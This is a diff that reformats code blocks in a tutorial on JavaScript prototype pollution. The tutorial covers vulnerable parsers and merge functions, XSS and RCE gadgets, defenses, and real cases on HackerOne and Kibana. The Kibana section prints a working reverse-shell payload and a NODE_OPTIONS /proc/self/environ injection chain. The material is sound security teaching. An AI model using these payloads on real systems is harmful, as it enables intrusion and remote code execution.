@@ -18,17 +18,17 @@ Object-oriented programming in JavaScript is different from other programming la
 
 Let's take an example. Have you ever wondered where built-in functions come from when you use them?
 
-``` js
-var str = "a"
-var str2 = str.repeat(5) // Where does the repeat function come from?
+```js
+var str = "a";
+var str2 = str.repeat(5); // Where does the repeat function come from?
 ```
 
 You may even notice that the `repeat` method of two different strings is actually the same function:
 
-``` js
-var str = "a"
-var str2 = "b"
-console.log(str.repeat === str2.repeat) // true
+```js
+var str = "a";
+var str2 = "b";
+console.log(str.repeat === str2.repeat); // true
 ```
 
 Or if you have ever checked MDN, you would find that the title is not `repeat`, but `String.prototype.repeat`:
@@ -47,9 +47,9 @@ In JavaScript, there is a hidden property called `__proto__`, which stores the v
 
 For example:
 
-``` js
-var str = ""
-console.log(str.__proto__) // String.prototype
+```js
+var str = "";
+console.log(str.__proto__); // String.prototype
 ```
 
 The thing that `str.__proto__` points to is the "next level" where the JavaScript engine should look when it cannot find something on `str`. And this next level will be `String.prototype`.
@@ -60,17 +60,17 @@ Therefore, when you call `str.repeat`, you are actually calling `String.prototyp
 
 The same applies to things other than strings, such as objects:
 
-``` js
-var obj = {}
-console.log(obj.a) // undefined
-console.log(obj.toString) // ƒ toString() { [native code] }
+```js
+var obj = {};
+console.log(obj.a); // undefined
+console.log(obj.toString); // ƒ toString() { [native code] }
 ```
 
 Even though `obj` is an empty object, why does `obj.toString` exist? It's because when the JavaScript engine cannot find it on `obj`, it looks in `obj.__proto__`, and `obj.__proto__` points to `Object.prototype`. So `obj.toString` ultimately finds `Object.prototype.toString`.
 
-``` js
-var obj = {}
-console.log(obj.toString === Object.prototype.toString) // true
+```js
+var obj = {};
+console.log(obj.toString === Object.prototype.toString); // true
 ```
 
 ## Modifying Properties on the Default Prototype
@@ -83,13 +83,13 @@ You may wonder how the function can differentiate between different strings when
 
 The answer is `this`. Let's take a look at an example:
 
-``` js
-String.prototype.first = function() {
-  return this[0]
-}
+```js
+String.prototype.first = function () {
+  return this[0];
+};
 
-console.log("".first()) // undefined
-console.log("abc".first()) // a
+console.log("".first()); // undefined
+console.log("abc".first()); // a
 ```
 
 First, I added a method called `first` to `String.prototype`. So when I call `"".first`, the JavaScript engine looks up `String.prototype` through `__proto__` and finds that `String.prototype.first` exists, so it calls this function.
@@ -100,10 +100,10 @@ The way `String.prototype.first` is written above directly modifies the prototyp
 
 Furthermore, since `String.prototype` can be modified, it is natural that `Object.prototype` can also be modified, like this:
 
-``` js
-Object.prototype.a = 123
-var obj = {}
-console.log(obj.a) // 123
+```js
+Object.prototype.a = 123;
+var obj = {};
+console.log(obj.a); // 123
 ```
 
 Because `Object.prototype` has been modified, when accessing `obj.a`, the JavaScript engine cannot find the property `a` on `obj`, so it looks up `obj.__proto__`, which is `Object.prototype`, and finds `a` there, returning its value.
@@ -120,24 +120,26 @@ Let's say there is a search function on a website that retrieves the value of `q
 
 The code for this functionality is written as follows:
 
-``` js
+```js
 // get query string
-var qs = new URLSearchParams(location.search.slice(1))
+var qs = new URLSearchParams(location.search.slice(1));
 
 // put it on the screen and use innerText to avoid XSS
-document.body.appendChild(createElement({
-  tag: 'h2',
-  innerText: `Search result for ${qs.get('q')}`
-}))
+document.body.appendChild(
+  createElement({
+    tag: "h2",
+    innerText: `Search result for ${qs.get("q")}`,
+  })
+);
 
-function createElement(config){
-  const element = document.createElement(config.tag)
+function createElement(config) {
+  const element = document.createElement(config.tag);
   if (config.innerHTML) {
-    element.innerHTML = config.innerHTML
+    element.innerHTML = config.innerHTML;
   } else {
-    element.innerText = config.innerText
+    element.innerText = config.innerText;
   }
-  return element
+  return element;
 }
 ```
 
@@ -145,27 +147,29 @@ The code above seems fine, right? We wrote a function `createElement` to simplif
 
 It appears to be correct, but what if there was a prototype pollution vulnerability before executing this code that allowed an attacker to pollute properties on the prototype? For example, something like this:
 
-``` js
+```js
 // Assumed we can do prototype pollution
-Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'
+Object.prototype.innerHTML = "<img src=x onerror=alert(1)>";
 
 // Below is the same as before
-var qs = new URLSearchParams(location.search.slice(1))
+var qs = new URLSearchParams(location.search.slice(1));
 
-document.body.appendChild(createElement({
-  tag: 'h2',
-  innerText: `Search result for ${qs.get('q')}`
-}))
+document.body.appendChild(
+  createElement({
+    tag: "h2",
+    innerText: `Search result for ${qs.get("q")}`,
+  })
+);
 
-function createElement(config){
-  const element = document.createElement(config.tag)
+function createElement(config) {
+  const element = document.createElement(config.tag);
   // if(config.innerHTML) will be true because of the polluted innerHTML
   if (config.innerHTML) {
-    element.innerHTML = config.innerHTML
+    element.innerHTML = config.innerHTML;
   } else {
-    element.innerText = config.innerText
+    element.innerText = config.innerText;
   }
-  return element
+  return element;
 }
 ```
 
@@ -187,38 +191,38 @@ For example, the [qs](https://github.com/ljharb/qs#parsing-objects) library supp
 
 If you were responsible for implementing this functionality, how would you write it? We can start with a basic version that only handles objects (without considering URL encoding or arrays):
 
-``` js
+```js
 function parseQs(qs) {
-  let result = {}
-  let arr = qs.split('&')
-  for(let item of arr) {
-    let [key, value] = item.split('=')
-    if (!key.endsWith(']')) {
+  let result = {};
+  let arr = qs.split("&");
+  for (let item of arr) {
+    let [key, value] = item.split("=");
+    if (!key.endsWith("]")) {
       // for a normal key-value pair
-      result[key] = value
-      continue
+      result[key] = value;
+      continue;
     }
 
     // for object
-    let items = key.split('[')
-    let obj = result
-    for(let i = 0; i < items.length; i++) {
-      let objKey = items[i].replace(/]$/g, '')
+    let items = key.split("[");
+    let obj = result;
+    for (let i = 0; i < items.length; i++) {
+      let objKey = items[i].replace(/]$/g, "");
       if (i === items.length - 1) {
-        obj[objKey] = value
+        obj[objKey] = value;
       } else {
-        if (typeof obj[objKey] !== 'object') {
-          obj[objKey] = {}
+        if (typeof obj[objKey] !== "object") {
+          obj[objKey] = {};
         }
-        obj = obj[objKey]
+        obj = obj[objKey];
       }
     }
   }
-  return result
+  return result;
 }
 
-var qs = parseQs('test=1&a[b][c]=2')
-console.log(qs)
+var qs = parseQs("test=1&a[b][c]=2");
+console.log(qs);
 // { test: '1', a: { b: { c: '2' } } }
 ```
 
@@ -226,12 +230,12 @@ Basically, it constructs an object based on the content inside `[]` and assigns 
 
 But wait! If my query string looks like this, things change:
 
-``` js
-var qs = parseQs('__proto__[a]=3')
-console.log(qs) // {}
+```js
+var qs = parseQs("__proto__[a]=3");
+console.log(qs); // {}
 
-var obj = {}
-console.log(obj.a) // 3
+var obj = {};
+console.log(obj.a); // 3
 ```
 
 When the query string is like this, `parseQs` will modify the value of `obj.__proto__.a`, causing prototype pollution. As a result, when I later declare an empty object and print `obj.a`, it prints 3 because the object prototype has been polluted.
@@ -244,73 +248,73 @@ Many query string parsing libraries have encountered similar issues. Here are a 
 
 Apart from parsing query strings, another common scenario where this issue occurs is object merging. A simple object merging function looks like this:
 
-``` js
+```js
 function merge(a, b) {
-  for(let prop in b) {
-    if (typeof a[prop] === 'object') {
-      merge(a[prop], b[prop])
+  for (let prop in b) {
+    if (typeof a[prop] === "object") {
+      merge(a[prop], b[prop]);
     } else {
-      a[prop] = b[prop]
+      a[prop] = b[prop];
     }
-  } 
+  }
 }
 
 var config = {
   a: 1,
   b: {
-    c: 2
-  }
-}
+    c: 2,
+  },
+};
 
 var customConfig = {
   b: {
-    d: 3
-  }
-}
+    d: 3,
+  },
+};
 
-merge(config, customConfig)
-console.log(config)
+merge(config, customConfig);
+console.log(config);
 // { a: 1, b: { c: 2, d: 3 } }
 ```
 
 If the `customConfig` above is controllable, problems can arise:
 
-``` js
+```js
 var config = {
   a: 1,
   b: {
-    c: 2
-  }
-}
+    c: 2,
+  },
+};
 
-var customConfig = JSON.parse('{"__proto__": {"a": 1}}')
-merge(config, customConfig)
+var customConfig = JSON.parse('{"__proto__": {"a": 1}}');
+merge(config, customConfig);
 
-var obj = {}
-console.log(obj.a)
+var obj = {};
+console.log(obj.a);
 ```
 
 Here, we use `JSON.parse` because directly writing:
 
-``` js
+```js
 var customConfig = {
   __proto__: {
-    a: 1
-  }
-}
+    a: 1,
+  },
+};
 ```
 
 won't work; `customConfig` will only be an empty object. To create an object with a key of `__proto__`, we need to use `JSON.parse`:
 
-``` js
+```js
 var obj1 = {
   __proto__: {
-    a: 1
-  }
-}
-var obj2 = JSON.parse('{"__proto__": {"a": 1}}')
-console.log(obj1) // {}
-console.log(obj2) // { __proto__: { a: 1 } }
+    a: 1,
+  },
+};
+var obj2 = JSON.parse('{"__proto__": {"a": 1}}');
+console.log(obj1); // {}
+console.log(obj2); // { __proto__: { a: 1 } }
 ```
 
 Similarly, many merge-related libraries have had this vulnerability. Here are a few examples:
@@ -327,12 +331,12 @@ Besides these, almost any library that operates on objects has encountered simil
 
 The quiz I presented at the end of the previous article is also a vulnerable area:
 
-``` js
-onmessage = function(event){
-  const { x, y, color } = event.data
+```js
+onmessage = function (event) {
+  const { x, y, color } = event.data;
   // for example, screen[10][5] = 'red'
-  screen[y][x] = color
-}
+  screen[y][x] = color;
+};
 ```
 
 An attacker can pass `{y: '__proto__', x: 'test', color: '123'}`, which will result in `screen.__proto__.test = '123'`, polluting `Object.prototype.test`. Therefore, for values passed by users, it is crucial to perform validation.
@@ -343,50 +347,47 @@ Now that we know where prototype pollution issues can occur, it is not enough to
 
 These "code snippets that can be exploited if we pollute the prototype" are called script gadgets. There is a GitHub repository dedicated to collecting these gadgets: [Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution). Some of these gadgets may be unimaginable. Let me demonstrate:
 
-``` html
+```html
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="utf-8">
-  <script src="https://unpkg.com/vue@2.7.14/dist/vue.js"></script>
-</head>
-<body>
-  <div id="app">
-    {{ message }}
-  </div>
-  <script>
-    // pollute template
-    Object.prototype.template = '<svg onload=alert(1)></svg>';
-    var app = new Vue({ 
-      el: '#app',
-      data: {
-        message: 'Hello Vue!'
-      }
-    });
-  </script>
-</body>
+  <head>
+    <meta charset="utf-8" />
+    <script src="https://unpkg.com/vue@2.7.14/dist/vue.js"></script>
+  </head>
+  <body>
+    <div id="app">{{ message }}</div>
+    <script>
+      // pollute template
+      Object.prototype.template = "<svg onload=alert(1)></svg>";
+      var app = new Vue({
+        el: "#app",
+        data: {
+          message: "Hello Vue!",
+        },
+      });
+    </script>
+  </body>
 </html>
-
 ```
 
 A seemingly harmless Vue hello world code, but after polluting `Object.prototype.template`, it becomes an XSS vulnerability that allows us to inject arbitrary code.
 
 Or like this:
 
-``` html
+```html
 <!DOCTYPE html>
 
 <html lang="en">
-<head>
-  <meta charset="utf-8">
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js"></script>
-</head>
-<body>
-  <script>
-    Object.prototype.innerText = '<svg onload=alert(1)></svg>';
-    document.write(sanitizeHtml('<div>hello</div>'))
-  </script>
-</body>
+  <head>
+    <meta charset="utf-8" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js"></script>
+  </head>
+  <body>
+    <script>
+      Object.prototype.innerText = "<svg onload=alert(1)></svg>";
+      document.write(sanitizeHtml("<div>hello</div>"));
+    </script>
+  </body>
 </html>
 ```
 
@@ -394,9 +395,9 @@ This is a library that is supposed to sanitize input, but after polluting `Objec
 
 Why do these issues occur? Taking the example of `sanitize-html`, it is because of this piece of code:
 
-``` js
+```js
 if (frame.innerText && !hasText && !options.textFilter) {
-    result += frame.innerText;
+  result += frame.innerText;
 }
 ```
 
@@ -404,36 +405,30 @@ Since `innerText` is assumed to be a safe string by default, it is directly conc
 
 In addition to client-side vulnerabilities, there are similar risks on the server-side, for example:
 
-``` js
-const child_process = require('child_process')
-const params = ['123']
-const result = child_process.spawnSync(
-  'echo', params
-);
-console.log(result.stdout.toString()) // 123
+```js
+const child_process = require("child_process");
+const params = ["123"];
+const result = child_process.spawnSync("echo", params);
+console.log(result.stdout.toString()); // 123
 ```
 
 This is a simple piece of code that executes the `echo` command and passes in a parameter. This parameter is automatically processed, so there is no need to worry about command injection:
 
-``` js
-const child_process = require('child_process')
-const params = ['123 && ls']
-const result = child_process.spawnSync(
-  'echo', params
-);
-console.log(result.stdout.toString()) // 123 && ls
+```js
+const child_process = require("child_process");
+const params = ["123 && ls"];
+const result = child_process.spawnSync("echo", params);
+console.log(result.stdout.toString()); // 123 && ls
 ```
 
 However, if there is a prototype pollution vulnerability, it can transform into RCE (Remote Code Execution), allowing attackers to execute arbitrary commands (assuming the attacker can control the params):
 
-``` js
-const child_process = require('child_process')
-const params = ['123 && ls']
-Object.prototype.shell = true // I only add this line
-const result = child_process.spawnSync(
-  'echo', params, {timeout: 1000}
-);
-console.log(result.stdout.toString())
+```js
+const child_process = require("child_process");
+const params = ["123 && ls"];
+Object.prototype.shell = true; // I only add this line
+const result = child_process.spawnSync("echo", params, { timeout: 1000 });
+console.log(result.stdout.toString());
 /*
 123
 index.js
@@ -465,11 +460,11 @@ There are several common defense methods. The first one is to block the `__proto
 
 However, besides `__proto__`, another bypass method should also be noted, like this:
 
-``` js
-var obj = {}
-obj['constructor']['prototype']['a'] = 1
-var obj2 = {}
-console.log(obj2.a) // 1
+```js
+var obj = {};
+obj["constructor"]["prototype"]["a"] = 1;
+var obj2 = {};
+console.log(obj2.a); // 1
 ```
 
 Using `constructor.prototype` can also contaminate properties on the prototype chain, so all these methods need to be blocked together to ensure safety.
@@ -480,9 +475,9 @@ The second method is simple and easy to understand, which is to avoid using obje
 
 Some people may have seen a way to create objects like this: `Object.create(null)`. This can create an empty object without the `__proto__` property, a truly empty object with no methods. Because of this, there won't be any prototype pollution issues:
 
-``` js
-var obj = Object.create(null)
-obj['__proto__']['a'] = 1
+```js
+var obj = Object.create(null);
+obj["__proto__"]["a"] = 1;
 // TypeError: Cannot set property 'a' of undefined
 ```
 
@@ -490,19 +485,19 @@ For example, the query string parsing library mentioned earlier, which is downlo
 
 > .parse(string, options?)
 > Parse a query string into an object. Leading ? or # are ignored, so you can pass location.search or location.hash directly.
->  
+>
 > The returned object is created with Object.create(null) and thus does not have a prototype.
 
 Another suggestion is to use `Map` instead of `{}`, but I think most people are still accustomed to using objects. `Object.create(null)` is a bit more convenient than `Map`.
 
 Alternatively, you can use `Object.freeze(Object.prototype)` to freeze the prototype, preventing modifications:
 
-``` js
-Object.freeze(Object.prototype)
-var obj = {}
-obj['__proto__']['a'] = 1
-var obj2 = {}
-console.log(obj2.a) // undefined
+```js
+Object.freeze(Object.prototype);
+var obj = {};
+obj["__proto__"]["a"] = 1;
+var obj2 = {};
+console.log(obj2.a); // undefined
 ```
 
 However, one issue with `Object.freeze(Object.prototype)` is that if a third-party package modifies `Object.prototype`, for example, by adding a property directly to it for convenience, it would be difficult to debug because modifying it after freezing won't cause an error, it just won't be successful.
@@ -513,15 +508,15 @@ As for Node.js, you can use the `--disable-proto` option to disable `Object.prot
 
 Alternatively, document policy could be used in the future to handle this. You can follow this issue: [Feature proposal: Mitigation for Client-Side Prototype Pollution](https://github.com/WICG/document-policy/issues/33).
 
-## Real-life Examples
+## Real-world Examples
 
-Finally, let's take a look at two real-life examples of prototype pollution to give you a better understanding.
+Finally, let's take a look at two real-world examples of prototype pollution to give you a better understanding.
 
 The first example is a vulnerability reported by vakzz to the well-known bug bounty platform hackerone in 2020 (yes, it's a vulnerability in the bug bounty platform itself). The complete report can be found here: [#986386 Reflected XSS on www.hackerone.com via Wistia embed code](https://hackerone.com/reports/986386)
 
 On the website, a third-party package is used, and inside this third-party package, there is a piece of code that looks like this:
 
-``` js
+```js
 i._initializers.initWLog = function() {
     var e, t, n, o, a, l, s, d, u, p, c;
     if (t = i.url.parse(location.href),
@@ -532,7 +527,7 @@ It parses `location.href` and `document.referrer`, where the former is controlle
 
 After the pollution, the author discovered another piece of code that is similar to the `createElement` we wrote earlier. `fromObject` traverses properties and puts them on the DOM:
 
-``` js
+```js
 if (this.chrome = r.elem.fromObject({
     id: r.seqId('wistia_chrome_'),
     class: 'w-chrome',
@@ -549,29 +544,29 @@ Another case is the vulnerability in Kibana reported by Michał Bentkowski. The 
 
 Within Kibana, there is a feature called Timelion, which allows users to input syntax and visualize it as charts. The following syntax can be used to pollute the prototype:
 
-``` js
+```js
 .es.props(label.__proto__.x='ABC')
 ```
 
 Polluting the prototype is just the first step. The next step is to find a script gadget. One of the code snippets in Kibana looks like this:
 
-``` js
-  var env = options.env || process.env;
-  var envPairs = [];
+```js
+var env = options.env || process.env;
+var envPairs = [];
 
-  for (var key in env) {
-    const value = env[key];
-    if (value !== undefined) {
-      envPairs.push(`${key}=${value}`);
-    }
+for (var key in env) {
+  const value = env[key];
+  if (value !== undefined) {
+    envPairs.push(`${key}=${value}`);
   }
+}
 ```
 
 This snippet retrieves environment variables, which are used to run a new node process. For example, if `envPairs` is `a=1`, it would execute the command `a=1 node xxx.js`.
 
 Since it runs node.js, we can secretly introduce a file using the `NODE_OPTIONS` environment variable:
 
-``` js
+```js
 // a.js
 console.log('a.js')
 
@@ -592,19 +587,19 @@ Yes! There is a commonly used technique where the content of certain files is co
 
 If we create an environment variable called `A=console.log(123)//`, the content of `/proc/self/environ` will become:
 
-``` js
-A=console.log(123)//YARN_VERSION=1.1PWD=/userLANG=en_US.UTF-8....
+```js
+A = console.log(123); //YARN_VERSION=1.1PWD=/userLANG=en_US.UTF-8....
 ```
 
 It becomes valid JavaScript code! We can execute it using this method:
 
-``` js
+```js
 NODE_OPTIONS="--require /proc/self/environ" A='console.log(1)//' node b.js
 ```
 
 The code provided by the author is:
 
-``` js
+```js
 .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
 .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
 ```
@@ -619,20 +614,20 @@ In fact, not only existing code and third-party libraries, but even some Web API
 
 As usual, it is most useful to provide examples:
 
-``` js
-fetch('https://example.com', {
-  mode: 'cors'
-})
+```js
+fetch("https://example.com", {
+  mode: "cors",
+});
 ```
 
 This is a simple piece of code that sends a GET request, but if there is a prototype pollution vulnerability:
 
-``` js
-Object.prototype.body = 'a=1'
-Object.prototype.method = 'POST'
-fetch('https://example.com', {
-  mode: 'cors'
-})
+```js
+Object.prototype.body = "a=1";
+Object.prototype.method = "POST";
+fetch("https://example.com", {
+  mode: "cors",
+});
 ```
 
 It transforms into a POST request!
